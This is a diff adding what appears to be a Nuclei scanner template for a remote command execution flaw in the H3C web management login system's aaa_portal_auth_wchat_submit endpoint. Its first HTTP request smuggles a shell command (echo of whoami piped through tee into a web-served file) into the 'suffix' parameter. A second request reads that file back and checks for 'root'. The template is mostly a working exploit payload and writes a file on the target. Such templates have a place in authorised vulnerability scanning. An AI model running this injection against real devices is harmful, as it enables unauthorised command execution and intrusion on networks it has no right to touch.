@@ -1,0 +1,27 @@
+id: h3c-aaaportalauthwchatsubmit-rce
+
+info:
+  name: h3c-aaaportalauthwchatsubmit-rce
+  author: HB
+  severity: critical
+  description: H3CWeb网管登录系统aaa_portal_auth_wchat_submit存在远程命令执行漏洞
+
+http:
+  - raw:
+      - |
+        GET /webui/?g=aaa_portal_auth_wchat_submit&suffix=;echo%20%60whoami%60%20|tee%20/usr/local/webui/sslvpn/stc.txt|ls HTTP/1.1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
+        Host: {{Hostname}}
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        Connection: close
+
+      - |
+        GET /sslvpn/stc.txt HTTP/1.1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
+        Host: {{Hostname}}
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        Connection: close
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_2==200 && contains_all(body_2,"root")'
